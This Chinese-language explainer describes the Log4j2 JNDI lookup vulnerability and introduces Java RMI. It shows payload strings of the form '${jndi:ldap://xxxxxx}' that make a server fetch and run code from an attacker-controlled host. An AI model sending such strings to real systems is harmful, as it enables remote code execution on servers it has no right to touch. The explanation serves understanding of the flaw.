Java Log4j2
<a name="UCc5j"></a>
### 漏洞描述
都知道在使用Apache Log4j2 记录日志的时候，会使用这样的格式`logger.info("params: {}", params);`，进行组装。log4j2 底层在进行组装的时候，如果发现传入的 params  当中含有`${}` 字符串的话会进行替换的时候会执行 `lookup` 的操作，所谓的 `lookup` 的操作就是允许通过 JNDI检索变量。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639441850838-e83433fc-d15d-43c6-b5e0-0af2637fb4f3.webp#clientId=u951a3431-d188-4&from=paste&id=uc7bad858&originHeight=700&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u33f30e43-a8b5-4f2f-80d2-069ea1ec39a&title=)<br />通过 JNDI 注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码，想想就很恐怖！也就是说当 params 中的参数包含一些特定的字符的时候，就会触发这个漏洞，这种字符数格式比如：`${jndi:ldap://xxxxxx}`，`${jndi:rmi://xxxxxx}` 其中xxxxxx 表示黑客的服务地址。<br />黑客通过构造这样的字符串来访问目标网站，只要程序通过 log4j2 将日志进行记录，不管是什么级别，就会将 log4j2 的 `lookup` 功能触发，然后就会通过 `RMI` 访问黑客的服务地址，黑客通过这个服务输出一个 class 字节码文件，这个字节码文件里面可以执行任何内容，相当于把这个服务器都交给黑客了，后果可想而知！
<a name="ba2di"></a>
### 攻击原理
![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1639447617356-4dfed61c-4b44-4867-b331-95d132394b6c.jpeg)
<a name="eSw2q"></a>
### RMI
RMI 是啥？<br />Java RMI（Java Remote Method Invocation），即 Java 远程方法调用。是 Java 编程语言里，一种用于实现远程过程调用的应用程序编程接口。有点类似于常用的服务注册发现机制一样，使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调用远程服务器上的对象，有点 RPC 的感觉。
